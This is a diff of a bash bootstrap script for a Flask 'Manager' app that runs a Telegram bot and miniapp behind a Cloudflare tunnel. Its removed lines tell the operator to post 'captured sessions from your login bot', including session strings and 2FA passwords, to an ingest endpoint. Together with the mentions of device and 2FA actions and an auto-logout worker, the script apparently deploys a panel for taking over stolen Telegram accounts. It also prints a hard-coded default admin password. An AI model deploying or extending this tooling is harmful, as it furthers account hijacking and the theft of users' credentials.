@@ -1,6 +1,7 @@
 #!/bin/bash
 # Manager — one-shot bootstrap
-# Installs deps, inits DB, optionally starts Cloudflare tunnel, runs the Flask app.
+# Installs deps, inits DB, optionally starts Cloudflare tunnel, runs the combined
+# Flask app (Manager UI + miniapp + bot polling + auto-logout worker).
 set -e
 
 RED='\033[0;31m'
@@ -12,7 +13,7 @@ NC='\033[0m'
 APP_DIR="$(cd "$(dirname "$0")" && pwd)"
 ENV_FILE="$APP_DIR/.env"
 VENV="$APP_DIR/venv"
-PORT="${PORT:-5001}"
+PORT="${PORT:-5000}"
 
 echo ""
 echo -e "${GREEN}======================================${NC}"
@@ -53,18 +54,19 @@ fi
 source "$ENV_FILE"
 if [ -z "$API_ID" ] || [ -z "$API_HASH" ]; then
   echo -e "${YELLOW}  ⚠ API_ID / API_HASH are empty in .env${NC}"
-  echo -e "${YELLOW}    Manager UI will run but device / 2FA actions will fail until you set them.${NC}"
+  echo -e "${YELLOW}    Manager UI will run but bot / device / 2FA actions will fail until you set them.${NC}"
   echo -e "${YELLOW}    Edit: nano $ENV_FILE${NC}"
 fi
 echo -e "${GREEN}  ✓ .env ready${NC}"
 
-# ---------- 4. DB init (handled by app.py on first run, but force once now) ----------
+# ---------- 4. DB init ----------
 echo -e "${YELLOW}[4/6] Initializing database…${NC}"
 "$VENV/bin/python3" -c "import sys; sys.path.insert(0, '$APP_DIR'); import db; db.init_db(); print('  ✓ DB ready')"
 
 # ---------- 5. Kill old instances ----------
 echo -e "${YELLOW}[5/6] Stopping old instances…${NC}"
 pkill -9 -f "python.*app.py" 2>/dev/null || true
+pkill -9 -f cloudflared 2>/dev/null || true
 if command -v lsof &> /dev/null; then
   if lsof -ti:"$PORT" > /dev/null 2>&1; then
     kill -9 $(lsof -ti:"$PORT") 2>/dev/null || true
@@ -82,7 +84,6 @@ if [ "$USE_TUNNEL" = "1" ]; then
     wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
     chmod +x /usr/local/bin/cloudflared
   fi
-  pkill -9 -f cloudflared 2>/dev/null || true
   rm -f /tmp/cf_manager.log
   nohup cloudflared tunnel --url http://localhost:"$PORT" > /tmp/cf_manager.log 2>&1 &
   for i in $(seq 1 30); do
@@ -94,6 +95,12 @@ if [ "$USE_TUNNEL" = "1" ]; then
   echo ""
   if [ -n "$CF_URL" ]; then
     echo -e "${GREEN}  ✓ Public URL: $CF_URL${NC}"
+    # persist into .env so the dashboard can show it
+    if ! grep -q "^MINI_APP_URL=" "$ENV_FILE"; then
+      echo "MINI_APP_URL=$CF_URL" >> "$ENV_FILE"
+    else
+      sed -i "s|^MINI_APP_URL=.*|MINI_APP_URL=$CF_URL|" "$ENV_FILE"
+    fi
   else
     echo -e "${YELLOW}  ⚠ Tunnel did not come up — running locally only${NC}"
   fi
@@ -106,21 +113,23 @@ echo ""
 echo -e "${GREEN}======================================${NC}"
 echo -e "${GREEN}  Manager starting…${NC}"
 echo -e "${GREEN}======================================${NC}"
-echo -e "  ${BLUE}Local:${NC}   http://localhost:$PORT"
-[ -n "$CF_URL" ] && echo -e "  ${BLUE}Public:${NC}  $CF_URL"
-echo -e "  ${BLUE}Logs:${NC}    tail -f $APP_DIR/app.log"
+BASE="$CF_URL"
+[ -z "$BASE" ] && BASE="http://localhost:$PORT"
+echo -e "  ${BLUE}Manager UI:${NC}  $BASE/"
+echo -e "  ${BLUE}Miniapp:${NC}     $BASE/m/   ← set this in @BotFather as the Web App URL"
+echo -e "  ${BLUE}Logs:${NC}        tail -f $APP_DIR/app.log"
 if [ "$USE_TUNNEL" = "1" ]; then
-  echo -e "  ${BLUE}Stop:${NC}    pkill -f 'python.*app.py' && pkill cloudflared"
+  echo -e "  ${BLUE}Stop:${NC}        pkill -f 'python.*app.py' && pkill cloudflared"
 else
-  echo -e "  ${BLUE}Stop:${NC}    pkill -f 'python.*app.py'"
+  echo -e "  ${BLUE}Stop:${NC}        pkill -f 'python.*app.py'"
 fi
-echo -e "  ${BLUE}Default admin password:${NC} manager123  (change in Settings)"
+echo -e "  ${BLUE}Admin pass:${NC}   manager123  (change in Settings)"
 echo ""
 
 cd "$APP_DIR"
 nohup "$VENV/bin/python3" "$APP_DIR/app.py" >> "$APP_DIR/app.log" 2>&1 &
 APP_PID=$!
-sleep 2
+sleep 3
 if kill -0 $APP_PID 2>/dev/null; then
   echo -e "${GREEN}✓ Manager running (PID: $APP_PID)${NC}"
 else
@@ -129,7 +138,8 @@ else
   exit 1
 fi
 echo ""
-echo -e "${YELLOW}Send captured sessions from your login bot to:${NC}"
-echo -e "  POST $([ -n "$CF_URL" ] && echo "$CF_URL" || echo "http://localhost:$PORT")/api/ingest"
-echo -e "  Body: { phone, user_id, username, name, session_string, twofa_password }"
+echo -e "${YELLOW}BotFather setup:${NC}"
+echo "  1. Open @BotFather"
+echo "  2. /mybots → select your bot → Bot Settings → Menu Button"
+echo -e "  3. Set Web App URL to: ${GREEN}$BASE/m/${NC}"
 echo ""
